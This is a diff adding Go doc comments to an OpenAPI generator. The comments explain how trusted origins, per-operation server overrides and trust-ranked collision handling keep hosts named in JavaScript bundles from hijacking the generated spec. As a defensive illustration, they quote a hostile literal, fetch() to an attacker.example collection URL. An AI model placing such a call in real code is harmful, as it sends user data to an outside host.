@@ -19,6 +19,40 @@
 //
 // Key components:
 //   - [OpenAPIGenerator] produces a valid OpenAPI 3.0 document in YAML format.
+//     [OpenAPIGenerator.TargetOrigin] is the origin the run can vouch for (the
+//     resolved target origin, from --target-url or the capture's own HTML
+//     page). The document's `servers` list and `info.title` derive from that
+//     trusted origin plus dynamically observed hosts; an unprobed JS-static
+//     candidate (crawl.IsJSStaticSource) may join `servers` only when it is
+//     same-origin with it. A cross-origin JS-static host therefore can never
+//     define the deliverable's identity — its bundle text was never fetched or
+//     executed, so a hostile literal like
+//     fetch("https://attacker.example/collect") must not be able to occupy
+//     servers[0] or capture info.title by sorting first (SEC-BE-002, LAB-4992
+//     review). Such a host is not silently relabelled either: the endpoints on
+//     it keep their real origin via a per-operation `servers` override, so a
+//     recovered path is never attributed to a host that does not serve it
+//     (SEC-BE-001). Grouping is origin-aware (origin is part of the internal
+//     endpointKey), so a group can never mix endpoints from different
+//     origins and the override is always correct for its group; when two
+//     groups' normalized path+method collide across origins, the colliding
+//     group with the lowest trust rank deterministically wins that slot —
+//     the primary origin first, then any other non-excluded origin, then an
+//     excluded origin OR an origin of unknown provenance (the empty string —
+//     crawl.CanonicalOrigin's result for a host-less literal such as
+//     "https:/api/x", a single slash after the scheme, which is not an
+//     authority marker) last, so neither an excluded nor an unknown-
+//     provenance origin can ever win over a vouched one regardless of which
+//     hostname (or lack thereof) sorts first (SEC-BE-002/TEST-001). "Excluded"
+//     means the run cannot vouch for the origin, NOT merely that a bundle
+//     mentioned it: an origin both observed on the wire and named by a bundle
+//     literal stays vouched, since otherwise an ordinary SPA bundle
+//     referencing its own API host would demote that host and hand a colliding
+//     slot back to an attacker-chosen origin (SEC-BE-002). The
+//     suppressed group is recorded (not silently dropped) via the
+//     `x-vespasian-collision-origins` extension on the winning operation.
+//     static:html is deliberately NOT treated as JS-static here — the page
+//     carrying the form was fetched over the wire during the crawl.
 //   - [NormalizePathsWithNames] is the primary normalization entry point. It
 //     accepts a population of observed paths and returns a map of input path
 //     to template path, performing both single-path regex detection (UUIDs,
